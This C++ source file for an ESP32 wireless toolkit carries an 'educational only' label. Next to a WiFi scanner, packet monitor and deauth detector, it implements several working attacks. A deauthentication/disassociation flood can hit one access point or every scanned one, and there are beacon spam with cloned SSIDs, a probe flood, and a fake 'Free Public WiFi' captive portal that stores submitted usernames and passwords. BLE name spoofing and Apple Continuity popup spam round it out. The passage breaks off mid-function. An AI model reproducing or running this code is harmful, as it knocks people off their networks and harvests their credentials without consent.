/*
 * UI.cpp – All screens + WiFi/BLE tool logic
 * No extra headers – everything kept here to avoid file jungle.
 * Educational / research use only. Only test networks you own.
 */

#include "UI.h"
#include "Theme.h"
#include <Arduino.h>
#include <string>
#include <string.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <NimBLEDevice.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"

// Required so ESP32 accepts raw 802.11 TX frames (linker --wrap)
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  return 0;
}

// Soft-AP web mode state (declared early – used by WiFi tools)
static bool webMode = false;
static void restoreWebAP();  // defined with web handlers

// ============================================================
//  WiFi Scanner
// ============================================================
#define WIFI_MAX_NETS 64

struct WifiNet {
  String  ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t ch;
  bool    hidden;
  uint8_t enc;
};

static WifiNet  wifiNets[WIFI_MAX_NETS];
static int      wifiCount = 0;
static bool     wifiScanning = false;

static void wifiScanBegin() {
  if (webMode) {
    // Keep Soft-AP up so the phone stays connected
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);  // don't kill AP
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  delay(40);
  wifiCount = 0;
  wifiScanning = false;
}

static void wifiScanStart() {
  if (wifiScanning) return;
  // Keep previous results visible until the new scan finishes
  wifiScanning = true;
  WiFi.scanDelete();
  int r = WiFi.scanNetworks(true, true);
  if (r == WIFI_SCAN_FAILED) {
    wifiScanning = false;
  }
}

static void wifiScanUpdate() {
  if (!wifiScanning) return;
  int16_t r = WiFi.scanComplete();
  if (r == WIFI_SCAN_RUNNING) return;
  wifiScanning = false;
  if (r < 0) { wifiCount = 0; return; }

  wifiCount = min((int)r, WIFI_MAX_NETS);
  for (int i = 0; i < wifiCount; i++) {
    wifiNets[i].ssid = WiFi.SSID(i);
    {
      uint8_t* b = WiFi.BSSID(i);
      if (b) memcpy(wifiNets[i].bssid, b, 6);
      else   memset(wifiNets[i].bssid, 0, 6);
    }
    wifiNets[i].rssi = WiFi.RSSI(i);
    wifiNets[i].ch   = WiFi.channel(i);
    wifiNets[i].enc  = (uint8_t)WiFi.encryptionType(i);
    wifiNets[i].hidden = (wifiNets[i].ssid.length() == 0);
    if (wifiNets[i].hidden) wifiNets[i].ssid = "<hidden>";
  }
  for (int i = 0; i < wifiCount-1; i++)
    for (int j = i+1; j < wifiCount; j++)
      if (wifiNets[j].rssi > wifiNets[i].rssi) {
        WifiNet t = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = t;
      }
  WiFi.scanDelete();
  if (webMode) restoreWebAP();
}

// ============================================================
//  Packet Monitor
// ============================================================
static volatile uint16_t pktCount[14];
static volatile uint32_t pktTotal = 0;
static uint8_t  pmChannel = 1;
static bool     pmRunning = false;
static uint32_t pmLastHop = 0;

static void IRAM_ATTR pmSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  if (p->rx_ctrl.channel >= 1 && p->rx_ctrl.channel <= 14) {
    pktCount[p->rx_ctrl.channel - 1]++;
    pktTotal++;
  }
}

static void pmStart() {
  memset((void*)pktCount, 0, sizeof(pktCount));
  pktTotal = 0;
  // keep channel if already set from web (1-13)
  if (pmChannel < 1 || pmChannel > 13) pmChannel = 1;
  pmRunning = true;
  pmLastHop = millis();
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  delay(50);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pmSniffer);
  esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
}

static void pmStop() {
  if (!pmRunning) return;
  pmRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void pmUpdate() {
  if (!pmRunning) return;
  if (millis() - pmLastHop >= 180) {
    pmLastHop = millis();
    if (webMode) {
      // Stay on selected channel so Soft-AP remains reachable
      esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
    } else {
      pmChannel++;
      if (pmChannel > 14) pmChannel = 1;
      esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
    }
  }
}

// ============================================================
//  Beacon Spammer (proper frames – based on nyanBOX patterns)
// ============================================================
static bool beaconRunning = false;
static uint8_t beaconIdx = 0;
static uint32_t beaconLast = 0;
static uint8_t beaconCh = 1;
static uint8_t beaconMac[6];
static uint32_t beaconSent = 0;
static uint8_t  beaconMode = 0;  // 0 = funny list, 1 = clone scanned, 2 = custom web list
static int      beaconCloneIdx = 0;

// Web-only custom beacon SSIDs (mode 2)
static char customBeaconSSIDs[10][33];
static int  customBeaconCount = 0;
static int  customBeaconIdx = 0;

static const char* beaconSSIDs[] = {
  "Free_WiFi", "Starbucks", "Airport_WiFi", "Hotel_Guest",
  "AndroidAP", "iPhone", "DIRECT-xy", "xfinitywifi",
  "FBI Surveillance Van", "Pretty Fly for a Wi-Fi",
  "Wu Tang LAN", "Never Gonna Give You Up", "404 Not Found",
  "Get Off My LAN", "Virus-Infected Wi-Fi", "The Password Is 1234",
  "Mom Use This One", "Abraham Linksys", "Martin Router King",
  "Bill Wi the Science Fi", "LAN Solo", "Silence of the LANs",
  "House LANister", "Ping's Landing", "The Promised LAN",
  "Darude LANstorm", "Loading...", "No Free Wi-Fi Here",
  "It Hurts When IP", "Drop It Like It's Hotspot"
};
static const int BEACON_SSID_COUNT = sizeof(beaconSSIDs) / sizeof(beaconSSIDs[0]);

static void beaconRandomMac() {
  for (int i = 0; i < 6; i++) beaconMac[i] = (uint8_t)esp_random();
  beaconMac[0] = (beaconMac[0] | 0x02) & 0xFE;  // locally administered, unicast
}

static int beaconBuildFrame(uint8_t* frame, const char* ssid, uint8_t channel, bool wpa2) {
  // RSN IE for WPA2-looking beacons
  static const uint8_t rsn[] = {
    0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F,
    0xAC, 0x02, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00
  };

  uint8_t* p = frame;
  *p++ = 0x80; *p++ = 0x00;           // Beacon
  *p++ = 0x00; *p++ = 0x00;           // Duration
  memset(p, 0xFF, 6); p += 6;         // Dest broadcast
  memcpy(p, beaconMac, 6); p += 6;    // Source
  memcpy(p, beaconMac, 6); p += 6;    // BSSID
  uint16_t seq = (uint16_t)((esp_random() & 0x0FFF) << 4);
  *p++ = seq & 0xFF; *p++ = (seq >> 8) & 0xFF;

  // Timestamp
  uint64_t ts = (uint64_t)esp_timer_get_time();
  memcpy(p, &ts, 8); p += 8;

  // Beacon interval (100 TU)
  *p++ = 0x64; *p++ = 0x00;
  // Capabilities: ESS + (privacy if wpa2)
  *p++ = wpa2 ? 0x11 : 0x01;
  *p++ = 0x04;

  // SSID element
  uint8_t ssidLen = (uint8_t)strnlen(ssid, 32);
  *p++ = 0x00; *p++ = ssidLen;
  memcpy(p, ssid, ssidLen); p += ssidLen;

  // Supported rates
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;

  // DS Parameter Set (channel)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  if (wpa2) {
    memcpy(p, rsn, sizeof(rsn));
    p += sizeof(rsn);
  }
  return (int)(p - frame);
}

static void beaconStart() {
  beaconRunning = true;
  beaconIdx = 0;
  beaconCloneIdx = 0;
  customBeaconIdx = 0;
  beaconLast = 0;
  beaconCh = 1;
  beaconSent = 0;
  beaconRandomMac();
  if (webMode) {
    // Keep ESP32-1 AP; only change channel for TX
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-1", "rgisking", beaconCh, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    // minimal AP so WIFI_IF_AP exists for TX
    WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
  }
  delay(40);
  esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
}

static void beaconStop() {
  beaconRunning = false;
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void beaconUpdate() {
  if (!beaconRunning) return;
  if (millis() - beaconLast < 25) return;
  beaconLast = millis();

  const char* ssid;
  if (beaconMode == 2 && customBeaconCount > 0) {
    ssid = customBeaconSSIDs[customBeaconIdx % customBeaconCount];
    if (webMode) beaconCh = 1;
  } else if (beaconMode == 1 && wifiCount > 0) {
    ssid = wifiNets[beaconCloneIdx].ssid.c_str();
    // In web mode keep Soft-AP channel (1) so the browser stays connected
    if (webMode) beaconCh = 1;
    else {
      beaconCh = wifiNets[beaconCloneIdx].ch;
      if (beaconCh < 1 || beaconCh > 13) beaconCh = 1;
    }
  } else {
    ssid = beaconSSIDs[beaconIdx];
    if (webMode) beaconCh = 1;  // lock channel while web UI is active
  }

  bool wpa2 = (esp_random() % 10) < 4;
  static uint8_t frame[128];
  int len = beaconBuildFrame(frame, ssid, beaconCh, wpa2);
  if (len > 0) {
    esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    beaconSent += 2;
  }

  if (beaconMode == 2 && customBeaconCount > 0) {
    customBeaconIdx = (customBeaconIdx + 1) % customBeaconCount;
    if (customBeaconIdx == 0) beaconRandomMac();
  } else if (beaconMode == 1 && wifiCount > 0) {
    beaconCloneIdx = (beaconCloneIdx + 1) % wifiCount;
    if (beaconCloneIdx == 0) beaconRandomMac();
  } else {
    beaconIdx = (beaconIdx + 1) % BEACON_SSID_COUNT;
    if (beaconIdx == 0) {
      if (!webMode) {
        if (beaconCh == 1) beaconCh = 6;
        else if (beaconCh == 6) beaconCh = 11;
        else beaconCh = 1;
      }
      beaconRandomMac();
    }
  }
}

// ============================================================
//  Deauth Detector
// ============================================================
static volatile uint32_t deauthCount = 0;
static volatile uint8_t  detLastMac[6];
static volatile int8_t   detLastRssi = 0;
static volatile uint8_t  detLastCh = 0;
static volatile bool     detMacSeen = false;
static bool detRunning = false;
static uint8_t detCh = 1;
static bool detMainOnly = true;  // hop 1/6/11 vs all 1-13

static void IRAM_ATTR detSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = p->payload;
  if (p->rx_ctrl.sig_len < 24) return;
  uint8_t subtype = (payload[0] & 0xF0);
  if (subtype == 0xC0 || subtype == 0xA0) {  // deauth or disassoc
    deauthCount++;
    // addr2 = source (bytes 10-15)
    for (int i = 0; i < 6; i++) detLastMac[i] = payload[10 + i];
    detLastRssi = p->rx_ctrl.rssi;
    detLastCh = detCh;
    detMacSeen = true;
  }
}

static void detStart() {
  deauthCount = 0;
  detMacSeen = false;
  detLastRssi = 0;
  detLastCh = 0;
  memset((void*)detLastMac, 0, 6);
  detCh = 1;
  detMainOnly = true;
  detRunning = true;
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  delay(40);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&detSniffer);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

static void detStop() {
  if (!detRunning) return;
  detRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void detUpdate() {
  if (!detRunning) return;
  static uint32_t last = 0;
  if (millis() - last > 280) {
    last = millis();
    if (detMainOnly) {
      if (detCh == 1) detCh = 6;
      else if (detCh == 6) detCh = 11;
      else detCh = 1;
    } else {
      detCh++;
      if (detCh > 13) detCh = 1;
    }
    esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
  }
}

// ============================================================
//  Deauth Attack (stronger frame + burst – nyanBOX style)
// ============================================================
static bool deauthRunning = false;
static int  deauthTarget = -1;
static uint32_t deauthSent = 0;
static uint32_t deauthLast = 0;
static uint8_t  deauthPacket[28];

static void deauthBuild(const uint8_t* bssid, bool disassoc = false) {
  // 28-byte deauth/disassoc (broadcast to clients from AP)
  memset(deauthPacket, 0, sizeof(deauthPacket));
  deauthPacket[0] = disassoc ? 0xA0 : 0xC0;  // Disassoc or Deauth
  deauthPacket[1] = 0x00;
  deauthPacket[2] = 0x3A;
  deauthPacket[3] = 0x01;
  memset(&deauthPacket[4], 0xFF, 6);           // Dest = broadcast
  memcpy(&deauthPacket[10], bssid, 6);         // Source = AP
  memcpy(&deauthPacket[16], bssid, 6);         // BSSID = AP
  deauthPacket[22] = 0x00; deauthPacket[23] = 0x00;
  deauthPacket[24] = 0x07; deauthPacket[25] = 0x00;
}

// Also build station->AP style (source broadcast, dest = AP) for extra pressure
static uint8_t deauthPacketRev[28];
static void deauthBuildRev(const uint8_t* bssid) {
  memset(deauthPacketRev, 0, sizeof(deauthPacketRev));
  deauthPacketRev[0] = 0xC0;
  deauthPacketRev[1] = 0x00;
  deauthPacketRev[2] = 0x3A;
  deauthPacketRev[3] = 0x01;
  memcpy(&deauthPacketRev[4], bssid, 6);       // Dest = AP
  memset(&deauthPacketRev[10], 0xFF, 6);       // Source = broadcast-ish
  memcpy(&deauthPacketRev[16], bssid, 6);      // BSSID
  deauthPacketRev[24] = 0x06; deauthPacketRev[25] = 0x00;  // reason class 2
}

static void deauthStart(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= wifiCount) return;
  deauthTarget = targetIdx;
  deauthRunning = true;
  deauthSent = 0;
  deauthLast = 0;
  deauthBuild(wifiNets[targetIdx].bssid, false);
  deauthBuildRev(wifiNets[targetIdx].bssid);

  uint8_t ch = wifiNets[targetIdx].ch;
  if (ch < 1 || ch > 13) ch = 1;
  if (webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-1", "rgisking", ch, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
  }
  delay(40);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void deauthStop() {
  deauthRunning = false;
  deauthTarget = -1;
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void deauthUpdate() {
  // deauthTarget >= 0: single AP; -2: all APs from last scan
  if (!deauthRunning) return;
  if (deauthTarget == -2) {
    if (wifiCount <= 0) { deauthStop(); return; }
    if (millis() - deauthLast < 30) return;
    deauthLast = millis();
    static int roundIdx = 0;
    if (roundIdx >= wifiCount) roundIdx = 0;
    int ti = roundIdx++;
    deauthBuild(wifiNets[ti].bssid, false);
    deauthBuildRev(wifiNets[ti].bssid);
    // Keep Soft-AP on CH1 in web mode so browser stays connected
    esp_wifi_set_channel(webMode ? 1 : wifiNets[ti].ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      deauthSent++;
    }
    deauthBuild(wifiNets[ti].bssid, true);
    for (int i = 0; i < 3; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
      deauthSent++;
    }
    for (int i = 0; i < 2; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketRev, sizeof(deauthPacketRev), false);
      deauthSent++;
    }
    return;
  }
  if (deauthTarget < 0 || deauthTarget >= wifiCount) {
    deauthStop();
    return;
  }
  if (millis() - deauthLast < 12) return;
  deauthLast = millis();
  esp_wifi_set_channel(webMode ? 1 : wifiNets[deauthTarget].ch, WIFI_SECOND_CHAN_NONE);
  // Deauth + disassoc + reverse direction bursts
  deauthBuild(wifiNets[deauthTarget].bssid, false);
  for (int i = 0; i < 6; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    deauthSent++;
  }
  deauthBuild(wifiNets[deauthTarget].bssid, true);  // disassoc
  for (int i = 0; i < 4; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    deauthSent++;
  }
  for (int i = 0; i < 4; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketRev, sizeof(deauthPacketRev), false);
    deauthSent++;
  }
}

static void deauthStartAll() {
  if (wifiCount <= 0) return;
  deauthTarget = -2;
  deauthRunning = true;
  deauthSent = 0;
  deauthLast = 0;
  if (webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-1", "rgisking", 1, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, 1, 1, 0);
  }
  delay(40);
}

// ============================================================
//  Probe Flood (improved probe request)
// ============================================================
static bool probeRunning = false;
static uint32_t probeSent = 0;
static uint32_t probeLast = 0;
static uint8_t  probeCh = 1;
static uint8_t  probeMac[6];
static uint8_t  probePacket[64];

static void probeRandomMac() {
  for (int i = 0; i < 6; i++) probeMac[i] = (uint8_t)esp_random();
  probeMac[0] = (probeMac[0] | 0x02) & 0xFE;
}

static int probeSsidIdx = 0;

static int probeBuildNamed(const char* ssid) {
  memset(probePacket, 0, sizeof(probePacket));
  uint8_t* p = probePacket;
  *p++ = 0x40; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  memset(p, 0xFF, 6); p += 6;
  memcpy(p, probeMac, 6); p += 6;
  memset(p, 0xFF, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  // SSID (empty = wildcard)
  uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
  *p++ = 0x00; *p++ = sl;
  if (sl) { memcpy(p, ssid, sl); p += sl; }
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
  *p++ = 0x03; *p++ = 0x01; *p++ = probeCh;
  return (int)(p - probePacket);
}

static void probeBuild() {
  probeBuildNamed(nullptr);  // wildcard default
}

static void probeStart() {
  probeRunning = true;
  probeSent = 0;
  probeLast = 0;
  probeCh = 1;
  probeRandomMac();
  probeBuild();
  if (webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-1", "rgisking", probeCh, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
  }
  delay(40);
  esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
}

static void probeStop() {
  probeRunning = false;
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void probeUpdate() {
  if (!probeRunning) return;
  if (millis() - probeLast < 10) return;
  probeLast = millis();

  // Alternate: wildcard + named probes from last WiFi scan
  const char* ssid = nullptr;
  if (wifiCount > 0 && (probeSent % 3) != 0) {
    ssid = wifiNets[probeSsidIdx % wifiCount].ssid.c_str();
    probeSsidIdx++;
  }
  int len = probeBuildNamed(ssid);
  esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
    probeSent++;
  }
  if (probeSent % 25 == 0) {
    if (!webMode) {
      probeCh++;
      if (probeCh > 13) probeCh = 1;
    } else {
      probeCh = 1;  // keep Soft-AP channel
    }
    probeRandomMac();
  }
}

// ============================================================
//  Captive Portal (basic SoftAP + DNS + simple page)
// ============================================================
static bool captiveRunning = false;
static DNSServer dnsServer;
static WebServer webServer(80);
static uint32_t captiveClients = 0;

static uint32_t captiveHits = 0;
static char captiveLastUser[32];
static char captiveLastPass[32];

static void handleCaptiveRoot() {
  captiveHits++;
  webServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in</title>"
    "<style>body{font-family:system-ui;background:#111;color:#eee;text-align:center;padding:24px}"
    "input,button{width:90%;max-width:280px;padding:12px;margin:8px;border-radius:8px;border:0;font-size:16px}"
    "button{background:#0a84ff;color:#fff;font-weight:600}</style></head>"
    "<body><h2>Wi-Fi Sign In</h2>"
    "<p>Connect to the network</p>"
    "<form method='POST' action='/login'>"
    "<input name='u' placeholder='Email or username' required><br>"
    "<input name='p' type='password' placeholder='Password' required><br>"
    "<button type='submit'>Continue</button></form>"
    "<p style='opacity:.5;font-size:12px'>Demo portal – educational only</p>"
    "</body></html>");
}

static void handleCaptiveLogin() {
  captiveHits++;
  if (webServer.hasArg("u")) {
    strncpy(captiveLastUser, webServer.arg("u").c_str(), sizeof(captiveLastUser)-1);
    captiveLastUser[sizeof(captiveLastUser)-1] = 0;
  }
  if (webServer.hasArg("p")) {
    strncpy(captiveLastPass, webServer.arg("p").c_str(), sizeof(captiveLastPass)-1);
    captiveLastPass[sizeof(captiveLastPass)-1] = 0;
  }
  webServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Thanks</title></head>"
    "<body style='font-family:system-ui;text-align:center;padding:40px'>"
    "<h2>Connecting...</h2><p>Please wait</p></body></html>");
}

static void captiveStart() {
  captiveRunning = true;
  captiveClients = 0;
  captiveHits = 0;
  captiveLastUser[0] = 0;
  captiveLastPass[0] = 0;
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free Public WiFi", "");
  delay(100);
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.onNotFound(handleCaptiveRoot);
  webServer.on("/", handleCaptiveRoot);
  webServer.on("/login", HTTP_POST, handleCaptiveLogin);
  webServer.on("/login", HTTP_GET, handleCaptiveRoot);
  webServer.begin();
}

static void captiveStop() {
  if (!captiveRunning) return;
  captiveRunning = false;
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

static void captiveUpdate() {
  if (!captiveRunning) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
  captiveClients = WiFi.softAPgetStationNum();
}

// ============================================================
//  Soft-AP Web UI mode  (BOOT held 2 s)
//  SSID: ESP32-1   Password: rgisking
//  Full handlers live after BLE tools (see below).
// ============================================================
static uint32_t bootHoldStart = 0;
static bool     bootWasDown = false;
static bool     webExitRequested = false;

// Forward decls for tools defined later
static void sniffStop();
static void spoofStop();
static void sourStop();
static void jamStop();
static void airTagStop();

static void restoreWebAP() {
  if (!webMode) return;
  // Keep Soft-AP alive for the browser session
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-1", "rgisking");
  delay(80);
}

static void stopAllTools() {
  pmStop();
  beaconStop();
  detStop();
  deauthStop();
  probeStop();
  captiveStop();
  sniffStop();
  spoofStop();
  sourStop();
  jamStop();
  airTagStop();
  wifiScanning = false;
  restoreWebAP();
}

// Placeholder – real implementations after BLE section
static void drawWebModeScreen();
static void enterWebMode();
static void exitWebMode();
static void setupWebRoutes();
static void handleWebClients();

// ============================================================
//  BLE Scanner
// ============================================================
#define BLE_MAX_DEVS 40

struct BleDev {
  String  name;
  String  addr;
  int32_t rssi;
};

static BleDev   bleDevs[BLE_MAX_DEVS];
static int      bleCount = 0;
static bool     bleScanning = false;
static bool     bleReady = false;

static void bleInit() {
  if (bleReady) return;
  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  bleReady = true;
}

static void bleScanStart() {
  if (bleScanning) return;
  bleInit();
  bleCount = 0;
  bleScanning = true;
  NimBLEScan* scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(80);
  scan->setMaxResults(BLE_MAX_DEVS);
  scan->start(4, nullptr, false);
}

static void bleScanUpdate() {
  if (!bleScanning) return;
  NimBLEScan* scan = NimBLEDevice::getScan();
  if (scan->isScanning()) return;
  bleScanning = false;
  NimBLEScanResults results = scan->getResults();
  bleCount = min((int)results.getCount(), BLE_MAX_DEVS);
  for (int i = 0; i < bleCount; i++) {
    NimBLEAdvertisedDevice d = results.getDevice(i);
    bleDevs[i].rssi = d.getRSSI();
    bleDevs[i].addr = d.getAddress().toString().c_str();
    if (d.haveName()) bleDevs[i].name = d.getName().c_str();
    else              bleDevs[i].name = bleDevs[i].addr;
  }
  for (int i = 0; i < bleCount-1; i++)
    for (int j = i+1; j < bleCount; j++)
      if (bleDevs[j].rssi > bleDevs[i].rssi) {
        BleDev t = bleDevs[i]; bleDevs[i] = bleDevs[j]; bleDevs[j] = t;
      }

  scan->clearResults();
}

// ============================================================
//  BLE Sniffer (re-uses scan results, continuous refresh)
// ============================================================
static bool sniffRunning = false;
static uint32_t sniffLast = 0;

static void sniffStart() {
  sniffRunning = true;
  sniffLast = 0;
  bleScanStart();   // kick first scan
}

static void sniffStop() {
  sniffRunning = false;
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
}

static void sniffUpdate() {
  if (!sniffRunning) return;
  // When previous scan finished, start another after short pause
  if (!bleScanning && (millis() - sniffLast > 1500)) {
    sniffLast = millis();
    bleScanStart();
  }
}

// ============================================================
//  BLE Spoofer – random/fake advertisements
// ============================================================
static bool spoofRunning = false;
static uint8_t spoofIdx = 0;
static uint32_t spoofLast = 0;
static uint8_t spoofMode = 0;  // 0 = name list, 1 = clone scanned, 2 = custom
static String  spoofCustomName = "ESP32-TYPHON";
static const char* spoofNames[] = {
  "AirPods Pro", "Galaxy Buds", "Pixel Buds", "Sony WH-1000",
  "JBL Flip", "Bose QC", "Beats Fit", "Unknown Device"
};
static const int SPOOF_COUNT = 8;

static void spoofStart() {
  spoofRunning = true;
  spoofIdx = 0;
  spoofLast = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
}

static void spoofStop() {
  if (!spoofRunning) return;
  spoofRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void spoofUpdate() {
  if (!spoofRunning) return;
  if (millis() - spoofLast < 800) return;
  spoofLast = millis();

  const char* name;
  if (spoofMode == 2) {
    name = spoofCustomName.c_str();
  } else if (spoofMode == 1 && bleCount > 0) {
    name = bleDevs[spoofIdx % bleCount].name.c_str();
    spoofIdx = (spoofIdx + 1) % bleCount;
  } else {
    name = spoofNames[spoofIdx % SPOOF_COUNT];
    spoofIdx = (spoofIdx + 1) % SPOOF_COUNT;
  }

  NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
  adv->stop();
  NimBLEAdvertisementData data;
  data.setName(name);
  data.setFlags(0x06);
  adv->setAdvertisementData(data);
  adv->setMinInterval(80);
  adv->setMaxInterval(160);
  adv->start();
}

// ============================================================
//  Sour Apple – selectable Continuity models/actions (nyanBOX style)
// ============================================================
struct AppleType {
  uint8_t     code;      // action code OR high byte of model
  uint8_t     code2;     // low byte for model packets (0 = action-style)
  const char* name;
  bool        isModel;   // true = device model packet, false = action popup
};

// Models (proximity pairing style) + Actions (nearby popup style)
static const AppleType appleList[] = {
  // Models
  { 0x0E, 0x20, "AirPods Pro", true },
  { 0x0A, 0x20, "AirPods Max", true },
  { 0x02, 0x20, "AirPods", true },
  { 0x0F, 0x20, "AirPods 2nd Gen", true },
  { 0x13, 0x20, "AirPods 3rd Gen", true },
  { 0x14, 0x20, "AirPods Pro 2", true },
  { 0x00, 0x55, "AirTag", true },
  { 0x10, 0x20, "Beats Flex", true },
  { 0x06, 0x20, "Beats Solo 3", true },
  { 0x0B, 0x20, "Powerbeats Pro", true },
  { 0x11, 0x20, "Beats Studio Buds", true },
  { 0x12, 0x20, "Beats Fit Pro", true },
  { 0x17, 0x20, "Beats Studio Pro", true },
  // Actions (iOS popups)
  { 0x13, 0x00, "AppleTV AutoFill", false },
  { 0x24, 0x00, "Apple Vision Pro", false },
  { 0x05, 0x00, "Apple Watch", false },
  { 0x09, 0x00, "Setup New iPhone", false },
  { 0x0B, 0x00, "HomePod Setup", false },
  { 0x01, 0x00, "Setup New AppleTV", false },
  { 0x06, 0x00, "Pair AppleTV", false },
  { 0x27, 0x00, "AppleTV Connecting", false },
  { 0x20, 0x00, "Join This AppleTV?", false },
  { 0x2F, 0x00, "Sign in other device", false },
};
static const int APPLE_LIST_COUNT = sizeof(appleList) / sizeof(appleList[0]);

static bool    sourRunning = false;
static int     sourSelected = 0;
static uint32_t sourLast = 0;
static uint32_t sourSent = 0;

static void sourStart() {
  sourRunning = false;
  sourLast = 0;
  sourSent = 0;
  bleInit();
  if (bleScanning) {
    NimBLEDevice::getScan()->stop();
    bleScanning = false;
  }
  NimBLEDevice::getAdvertising()->stop();
}

static void sourStop() {
  if (!sourRunning) return;
  sourRunning = false;
  NimBLEDevice::getAdvertising()->stop();
}

static void sourBeginAdvertise() {
  sourRunning = true;
  sourLast = 0;
  sourSent = 0;
  bleInit();
  if (bleScanning) {
